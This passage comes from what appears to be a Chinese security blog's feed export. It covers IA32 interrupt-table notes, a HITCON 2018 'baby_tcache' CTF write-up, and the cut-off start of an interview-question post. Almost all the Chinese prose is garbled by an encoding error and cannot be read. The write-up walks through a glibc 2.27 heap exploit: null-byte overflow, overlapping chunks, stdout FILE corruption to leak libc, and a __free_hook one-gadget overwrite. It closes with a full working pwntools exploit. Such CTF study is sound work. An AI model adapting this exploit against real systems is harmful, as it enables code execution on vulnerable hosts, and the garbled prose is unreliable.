Tableï¼ŒIVTï¼‰</h2><p>å®æ¨¡å¼ä¸‹ç”¨äºå­˜å‚¨ä¸­æ–­å¤„ç†ç¨‹åºå…¥å£çš„è¡¨</p><p>ç³»ç»Ÿå¼€æœºåå¤„äºå®æ¨¡å¼ï¼Œ1Mçš„å¯»å€ç©ºé—´ï¼Œç”±BOISåšæ£€æµ‹å’Œåˆå§‹åŒ–ï¼Œåˆå§‹åŒ–å°±åŒ…æ‹¬äº†åœ¨00000H~003ffh 1kbåŒºåŸŸå»ºç«‹ä¸­æ–­å‘é‡è¡¨ï¼Œè¡¨é‡Œçš„æ¯ä¸€é¡¹è®°å½•ä¸­æ–­æˆ–å¼‚å¸¸å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€ï¼Œå«åšä¸­æ–­å‘é‡ï¼Œå 4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å…±æœ‰256ä¸ªï¼ŒBIOSå†åˆ©ç”¨INTæ‰§è¡Œç‰¹å®šä¸­æ–­å¤„ç†ç¨‹åºæŠŠå¼•å¯¼ç¨‹åºä»ç£ç›˜åŠ è½½åˆ°å†…å­˜ï¼Œå¼•å¯¼åï¼Œè¿›å…¥ä¿æŠ¤æ¨¡å¼</p><h2 id="ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆInterrupt-Descriptor-Tableï¼ŒIDTï¼‰"><a href="#ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆInterrupt-Descriptor-Tableï¼ŒIDTï¼‰" class="headerlink" title="ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆInterrupt Descriptor Tableï¼ŒIDTï¼‰"></a>ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆInterrupt Descriptor Tableï¼ŒIDTï¼‰</h2><p>ä¿æŠ¤æ¨¡å¼ä¸‹ç”¨äºå­˜å‚¨ä¸­æ–­å¤„ç†ç¨‹åºå…¥å£çš„è¡¨</p><p>IDTRå¯„å­˜å™¨æ¥æè¿°çš„IDTçš„ä½ç½®å’Œé•¿åº¦lidtæŒ‡ä»¤å¯ä»¥å¾€idtré‡Œè£…å…¥æ•°æ®ï¼Œå’ŒGDTRä¸€æ ·å‰32ä½æ˜¯idtåœ°å€ï¼Œ16ä½è¡¨é•¿åº¦æè¿°è¡¨çš„å¤§å°ï¼Œä¸º0æ—¶å¤§å°æ˜¯1</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422230738609.png" alt="image-20230422230738609"></p><p>IDTçš„æ¯ä¸ªè¡¨é¡¹æ˜¯ä¸€ä¸ª8å­—èŠ‚çš„é—¨æè¿°ç¬¦ï¼ˆGate Descriptorï¼‰ç»“æ„</p><p>æˆ‘ä»¬ä¹‹å‰çš„æ®µæè¿°ç¬¦ä¸­æè¿°çš„æ˜¯ä¸€ç‰‡å†…å­˜åŒºåŸŸï¼Œè€Œé—¨æè¿°ç¬¦ä¸­æè¿°çš„æ˜¯ä¸€æ®µä»£ç </p><p>è¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰æ®µæè¿°ç¬¦çš„S&#x3D;0ä»£è¡¨è¯¥æè¿°ç¬¦æè¿°çš„æ˜¯ä¸€ä¸ªç³»ç»Ÿæ®µï¼ŒS&#x3D;1ä»£è¡¨è¯¥æè¿°ç¬¦æè¿°çš„æ˜¯ä»£ç æ®µã€æ•°æ®æ®µæˆ–å †æ ˆæ®µï¼ŒTYPEå’ŒSæ®µé…åˆä½¿ç”¨ï¼Œæ®µçš„è®¿é—®æƒé™æˆ–ç³»ç»Ÿæ§åˆ¶æè¿°ç±»å‹</p><p>è¿™é‡Œçš„é—¨å°±æ˜¯ç³»ç»Ÿæ®µS&#x3D;0ï¼Œæ ¹æ®TYPEä¸åŒåˆ†ä¸ºä¸åŒé—¨</p><p>ä»»åŠ¡é—¨æè¿°ç¬¦ 0101 ç”¨äºä»»åŠ¡åˆ‡æ¢</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232250447.png" alt="image-20230422232250447"></p><p>ä¸­æ–­é—¨æè¿°ç¬¦ D110 ç”¨äºæè¿°ä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„å…¥å£  IFä½è‡ªåŠ¨ç½® 0</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232346158.png" alt="image-20230422232346158"></p><p>é™·é˜±é—¨æè¿°ç¬¦ D111 ç”¨äºæè¿°å¼‚å¸¸å¤„ç†ä¾‹ç¨‹çš„å…¥å£ IFä½ä¸ä¼šè‡ªåŠ¨ç½®0</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232525942.png" alt="image-20230422232525942"></p><p>Dä½ç”¨æ¥è¡¨ç¤ºæè¿°çš„æ˜¯16ä½é—¨ï¼ˆ0ï¼‰è¿˜æ˜¯32ä½é—¨ï¼ˆ1ï¼‰ï¼ŒåŒæ ·DPLè¡¨ç¤ºè®¿é—®æœ¬æ®µçš„ æœ€ä½æƒé™è¦æ±‚</p><h2 id="å¼‚å¸¸å’Œä¸­æ–­å¤„ç†è¿‡ç¨‹"><a href="#å¼‚å¸¸å’Œä¸­æ–­å¤„ç†è¿‡ç¨‹" class="headerlink" title="å¼‚å¸¸å’Œä¸­æ–­å¤„ç†è¿‡ç¨‹"></a>å¼‚å¸¸å’Œä¸­æ–­å¤„ç†è¿‡ç¨‹</h2><p>CPUæ”¶åˆ°ä¸­æ–­å‘é‡å·åï¼ŒæŠŠIDTRé‡ŒIDTåŸºåœ°å€+ä¸­æ–­å‘é‡å·*8å¾—åˆ°ä¸­æ–­é—¨æè¿°ç¬¦</p><p>å¦‚æœæ˜¯ä½¿ç”¨INT3 int n INTOç­‰æŒ‡ä»¤äº§ç”Ÿçš„ä¸­æ–­æˆ–å¼‚å¸¸ï¼Œä¼šæ£€æµ‹CPLå’Œé—¨æè¿°ç¬¦é‡Œçš„DPLï¼ŒCPLæƒé™å¿…é¡»å¤§äºç­‰äºDPLï¼Œ</p><p>ç„¶åå†æ¬¡æ£€æµ‹CPLæƒé™å¿…é¡»å°äºé—¨æè¿°ç¬¦é‡Œé€‰æ‹©å­å¯¹äºä»£ç æ®µçš„DPLï¼Œä¹Ÿå°±æ˜¯ç‰¹æƒè½¬ç§»å¤„ç†é™¤äº†è¿”å›ï¼Œåªèƒ½ä»ä½æƒé™è½¬åˆ°é«˜æƒé™</p><p>å¦‚æœæ˜¯ç”±ç¡¬ä»¶äº§ç”Ÿçš„ä¸­æ–­æˆ–å¤„ç†å™¨æ£€æµ‹åˆ°çš„å¼‚å¸¸ï¼Œä¸ä¼šè¿›è¡Œç¬¬ä¸€æ¬¡å’Œé—¨æè¿°ç¬¦DPLçš„æ£€æµ‹ï¼Œåªå’Œä»£ç æ®µæ£€æµ‹</p><p>æŠŠé€‰æ‹©å­åŠ è½½åˆ°cs åç§»åŠ è½½åˆ°eipæ‰§è¡Œ</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423013430409.png" alt="image-20230423013430409"></p><h2 id="ä¸­æ–­å‘ç”Ÿæ—¶çš„å‹æ ˆ"><a href="#ä¸­æ–­å‘ç”Ÿæ—¶çš„å‹æ ˆ" class="headerlink" title="ä¸­æ–­å‘ç”Ÿæ—¶çš„å‹æ ˆ"></a>ä¸­æ–­å‘ç”Ÿæ—¶çš„å‹æ ˆ</h2><p>æ‹¿åˆ°ä¸­æ–­æè¿°ç¬¦åCPLå’Œæè¿°ç¬¦é‡Œçš„é€‰æ‹©å­å¯¹åº”å½“çš„DPLæ¯”è¾ƒ</p><p>&gt;&gt;&gt;CPLæƒé™ä½äºDPLçš„è¯éœ€è¦åˆ‡æ¢åˆ°é«˜ç‰¹æƒçº§çš„æ ˆï¼Œä¸ºäº†æ‰§è¡Œå®Œä¸­æ–­åæ¢å¤ï¼Œä¼šå…ˆä¸´æ—¶ä¿å­˜å½“å‰æ ˆçš„sså’Œespï¼Œä»TSSæ®µé‡Œæ‹¿åˆ°DPLçº§åˆ«çš„æ ˆåŠ è½½åˆ°sså’Œespï¼Œç„¶åæŠŠä¸´æ—¶ä¿å­˜çš„æ—§ssï¼šespå‹å…¥æ–°æ ˆï¼Œç„¶åå‹å…¥eflagså¯„å­˜å™¨ï¼Œcsï¼Œeip,æœ‰çš„ä¸­æ–­è¿˜ä¼šå‹å…¥å‡ºé”™ç </p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423020740539.png" alt="image-20230423020740539"></p><p>&gt;&gt;&gt;CPL&#x3D;DPLæ˜¯ä¸ç”¨åˆ‡æ¢å †æ ˆï¼Œæ•…ä¸ç”¨å‹å…¥åŸss espï¼Œå…¶ä½™ä¸€æ ·</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423021021604.png" alt="image-20230423021021604"></p><p>ç„¶åé€‰æ‹©å­åŠ è½½åˆ°cs åç§»åŠ è½½åˆ°eiï¼Œæ‰§è¡Œä¸­æ–­å¤„ç†ç¨‹åºï¼Œä¸­æ–­æ‰§è¡Œå®Œç”¨iretæŒ‡ä»¤è¿”å›è¢«ä¸­æ–­ç¨‹åºï¼Œiretä¼šæŠŠeip cs eflagså¼¹å‡ºåˆ°å¯„å­˜å™¨ï¼Œiretæ‰§è¡Œæ—¶espå¿…é¡»æŒ‡å‘eipï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è‡ªå·±å¼¹å‡ºå‡ºé”™ç </p><p>iretåŒæ ·ä¼šè¿›è¡Œæƒé™æ£€æµ‹ï¼Œè¿›è¡Œé€†è¿‡ç¨‹å†³å®šæ˜¯ä¸æ˜¯å¼¹å‡ºå°±ss:esp</p><h2 id="IA32ä¸­æ–­å‘é‡å·"><a href="#IA32ä¸­æ–­å‘é‡å·" class="headerlink" title="IA32ä¸­æ–­å‘é‡å·"></a>IA32ä¸­æ–­å‘é‡å·</h2><p>0-255</p><p>å…¶ä¸­0-31è¢«cpuè®¾è®¡è€…å ç”¨ï¼Œ32-255ä¾›æ“ä½œç³»ç»Ÿç­‰ä½¿ç”¨</p><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>32-255</td><td>ç”¨æˆ·å®šä¹‰ä¸­æ–­</td><td>ä¸­æ–­</td><td>å¯å±è”½ä¸­æ–­</td><td>æ¥è‡ªINTRçš„å¤–éƒ¨ä¸­æ–­æˆ–INT næŒ‡ä»¤</td><td></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2018 HITCON PWN baby_tcache</title>
      <link href="/2023/04/19/HITCON-2018-PWN-baby-tcache/"/>
      <url>/2023/04/19/HITCON-2018-PWN-baby-tcache/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA">https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA</a><br>æå–ç ï¼š79ui</p><p>libc2.27</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/c/p/heap&gt; checksec baby_tcache</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/baby_tcache&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>åªæœ‰addå’ŒdeleteåŠŸèƒ½ï¼Œæœ€å¤š10ä¸ªchunkï¼Œæ¼æ´ä¹Ÿå¾ˆå®¹æ˜“æ‰¾åˆ°</p><p>newé‡Œçš„<code> v3[size] = 0;</code>null byte oneæ¼æ´</p><p>å¾ˆå®¹æ˜“å¯ä»¥åˆ©ç”¨å»æ„æˆoverlapping chunk å»åšfreehookå°±è¡Œäº†ï¼Œä½†æ˜¯ç¨‹åºæ²¡æœ‰è¾“å‡ºï¼Œæ€ä¹ˆæ³„éœ²libcå‘¢</p><p>è¾“å‡ºå‡½æ•°åªæœ‰printfå’Œputsï¼Œprintfåœ¨IOFILEé‡Œåˆ†æè¿‡äº†çœ‹ä¸‹putsæŠŠ</p><p><code>libio/ioputs.c</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç†Ÿæ‚‰çš„_IO_sputnè°ƒç”¨ï¼Œfwriteçš„ä¸»è¦å‡½æ•°ï¼Œæœ€ç»ˆä¼šè¾“å‡º<code>_IO_2_1_stdout_</code>ä¸­_IO_write_base~IO_write_pträ¹‹é—´çš„å†…å®¹ï¼Œè™½ç„¶ç¨‹åºç”¨setvbufå…³äº†ç¼“å†²åŒºï¼Œä½†æ˜¯setvbufæ˜¯æ‰“å¼€_IO_2_1_stdout_çš„flagä½ä¸¤ä¸ªbitæ¥å…³é—­ç¼“å†²åŒºçš„ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶åº•å±‚çš„flagï¼Œè¿˜æ€•è¿™ä¸ª?</p><p>æ€è·¯æŠŠ_IO_2_1_stdout_é“¾å…¥binä¼ªé€ ä¸€æ³¢ï¼Œè·å–libcï¼Œåˆ©ç”¨overlappingåšfreehook</p><h3 id="overlapping-chunk"><a href="#overlapping-chunk" class="headerlink" title="overlapping chunk"></a>overlapping chunk</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 //é˜²æ­¢0å’Œ5åˆå¹¶æ—¶ï¼Œå’Œtopchunkåˆå¹¶</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>ç”³è¯·äº†6ä¸ªå †</p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419233901431.png" alt="image-20230419233901431" style="zoom:80%;"><p>æƒ³è®©å †5åšå…ˆå‰åˆå¹¶åˆ°0ï¼Œå°±éœ€è¦ä¿®æ”¹å †5çš„prevsizeå’Œprevinuseä½ï¼Œ</p><p>é‡Šæ”¾å †5æ—¶è¦åˆ¶é€ å‰é¢æ‰€æœ‰å †å—æ˜¯ä¸€ä¸ªå¤§å †å—ä¸”freeçŠ¶æ€çš„å‡è±¡ï¼Œprevsize&#x3D;0x500+0x40+0x50+0x60+0x70&#x3D;0x660</p><p>é‡Šæ”¾4å†ç”³è¯·0x68æ‹¿å›æ¥åŸæ¥çš„chunkï¼Œç”±äºç©ºé—´å¤ç”¨å’Œnull byte overflow å¯ä»¥ä¿®æ”¹å †5çš„prevsizeå’Œprevinuseä½</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234348442.png" alt="image-20230419234348442"></p><p>é‡Šæ”¾0å†é‡Šæ”¾5æ„æˆunlinkï¼Œå¯¼è‡´overlapping</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234533161.png" alt="image-20230419234533161"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234624496.png" alt="image-20230419234624496"></p><p>å¤§å°ä¸º0x660+0x500&#x3D;0xB60ç¬¦åˆé¢„æœŸ</p><p>åŒæ—¶æŠŠå †2æ”¾å…¥biné‡Œä¸ºä¸‹ä¸€æ­¥åšå‡†å¤‡</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234602649.png" alt="image-20230419234602649"></p><h3 id="IO-2-1-stdoutå…¥é“¾"><a href="#IO-2-1-stdoutå…¥é“¾" class="headerlink" title="IO_2_1_stdoutå…¥é“¾"></a>IO_2_1_stdoutå…¥é“¾</h3><p>æˆ‘ä»¬å¯ä»¥åˆ‡å‰²unsortedbinæ¥è®©åœ¨tcachebinçš„å †2çš„fdæŒ‡å‘unsortedbinï¼Œ</p><p>åˆ‡å‰²å¤§å°ä¸º0x500+0x40ï¼Œå‡å»chunkheadä¸º0x530å¤§å°</p><p>add(0x530)</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235740115.png" alt="image-20230419235740115"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235803167.png" alt="image-20230419235803167"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000100153.png" alt="image-20230420000100153"></p><p>ç”³è¯·å‡ºæ¥å°¾å·1790çš„chunkï¼ŒæŠŠä»–çš„fdä½ä¸¤ä¸ªå­—èŠ‚æ”¹æ‰å°±å¯ä»¥å…¥é“¾</p><p><code>add(0xa0, b&#39;\x60\xc7&#39;)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000346155.png" alt="image-20230420000346155"></p><h3 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc"></a>æ³„éœ²libc</h3><p>æ‹¿å‡ºæ¥stdoutè¿›è¡Œä¼ªé€ </p><p>flagéœ€è¦æ»¡è¶³</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure><p>å³flag&#x3D;0xFBAD1800</p><p><code>add(0x40)</code></p><p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code></p><p>ä¸ºä»€ä¹ˆä¼šæ˜¯3fè¿™ä¹ˆå¥‡æ€ªçš„æ•°å­—è€Œä¸æ˜¯ç›´æ¥0x40å¤§å°ï¼Œåº”ä¸ºæˆ‘ä»¬ç¨‹åºä¼šv3[size] &#x3D; 0;ä¼šåœ¨ç”³è¯·åˆ°çš„å †0x7ffff7bec760+sizeä½ç½®é›¶ï¼Œåœ¨stdoutçš„IO_FILEç»“æ„ä½“é‡Œéšä¾¿ç½®é›¶ææœ‰å¯èƒ½å¯¼è‡´ç¨‹åºcrashæ‰</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003158991.png" alt="image-20230420003158991"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003516321.png" alt="image-20230420003516321"></p><p>æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©äº†ä¸€å—æœ¬æ¥å°±æ˜¯é›¶çš„åœ°æ–¹ï¼Œ0x3e 0x3f 0x47 0x48éƒ½å¯ä»¥</p><p>ä¿®æ”¹å‰</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420001600223.png" alt="image-20230420001600223"></p><p>ä¿®æ”¹å</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003955229.png" alt="image-20230420003955229"></p><p>ä¸‹æ¬¡è¾“å‡ºèœå•æ—¶å³å¯æ³„éœ²åœ°å€</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004449167.png" alt="image-20230420004449167"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004531732.png" alt="image-20230420004531732"></p><h3 id="freehook"><a href="#freehook" class="headerlink" title="freehook"></a>freehook</h3><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬çœ‹ä¸‹unsortbin</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420005729367.png" alt="image-20230420005729367"></p><p>å“Ÿï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬çš„å †4å—ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å‰é¢</p><p><code>add(0x40)</code></p><p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code>çš„æ—¶å€™é‡Šæ”¾æ‰chunk4æ—¶ï¼Œä¸å°±å¯ä»¥æŠŠchunk4æ”¾å…¥tcacheå—</p><p><code>delete(4) add(0x530) add(0xa0, b&#39;\x60\xc7&#39;)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010052891.png" alt="image-20230420010052891"></p><p>ä¸¤æ¬¡ç”³è¯·freehooké‡Œå†™å…¥onegadgetå³å¯</p><p><code>add(0x60,p64(libcelf.symbols[&#39;__free_hook&#39;]))</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010633032.png" alt="image-20230420010633032"></p><p><code>add(0x60) add(0x60,p64(onegadget))</code></p><p><code>delete(0)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010811418.png" alt="image-20230420010811418"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./baby_tcache&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=ELF(<span class="string">&#x27;/mnt/hgfs/Share/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&#x27;x&#x27;</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 </span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment"># db(&#x27;b malloc&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0D83)&#x27;)</span></span><br><span class="line">add(<span class="number">0x48</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">66</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">libc=uu64(r(<span class="number">6</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">libcelf.address=libc</span><br><span class="line">onegadget=libc+<span class="number">0x4f302</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0xa0</span>,p64(libcelf.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache </tag>
            
            <tag> IO FILE </tag>
            
            <tag> Null Byte Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>An interview question from baidu</title>
      <link href="/2023/04/17/An-interview-question-from-baidu/"/>
      <url>/2023/04/17/An-interview-question-from-baidu/</url>
      
        <content type="html"><![CDATA[<h2 id="æµä¼ çš„ä¸€é“ç™¾åº¦é¢è¯•é¢˜"><a href="#æµä¼ çš„ä¸€é“ç™¾åº¦é¢è¯•é¢˜" class="headerlink" title="æµä¼ çš„ä¸€é“ç™¾åº¦é¢è¯•é¢˜"></a>æµä¼ çš„ä¸€é“ç™¾åº¦é¢è¯•é¢˜</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">double</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span 